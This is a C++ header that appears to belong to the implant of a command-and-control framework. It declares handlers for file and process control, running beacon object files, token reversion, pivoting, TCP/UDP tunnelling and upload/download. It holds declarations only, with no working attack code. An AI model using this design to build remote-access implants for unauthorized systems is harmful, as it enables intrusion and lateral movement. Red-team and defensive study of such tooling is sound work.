#pragma once

#include <windows.h>
#include "Packer.h"
#include "Agent.h"

#define COMMAND_CAT		     24
#define COMMAND_CD		     8
#define COMMAND_CP           12
#define COMMAND_DISKS        15
#define COMMAND_EXEC_BOF     50
#define COMMAND_EXEC_BOF_OUT 51
#define COMMAND_GETUID       22
#define COMMAND_JOBS_LIST	 46
#define COMMAND_JOBS_KILL    47
#define COMMAND_PWD          4
#define COMMAND_LS		     14
#define COMMAND_MV		     18
#define COMMAND_MKDIR	     27
#define COMMAND_PROFILE      21
#define COMMAND_PS_LIST      41
#define COMMAND_PS_KILL      42
#define COMMAND_PS_RUN       43
#define COMMAND_TERMINATE    10
#define COMMAND_REV2SELF     23
#define COMMAND_RM           17
#define COMMAND_UPLOAD       33

#define COMMAND_SAVEMEMORY 0x2321
#define COMMAND_ERROR      0x1111ffff

class Agent;

class Commander
{
public:
	Agent* agent;

	Commander(Agent* agent);

	void ProcessCommandTasks(BYTE* recv, ULONG recv_size, Packer* outPacker);

	void CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdPivotExec(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdRev2Self(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTunnelMsgConnectUDP(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTunnelMsgWriteTCP(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTunnelMsgWriteUDP(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTunnelMsgClose(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTunnelMsgReverse(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdUnlink(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);

	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void Exit(Packer* outPacker);
};
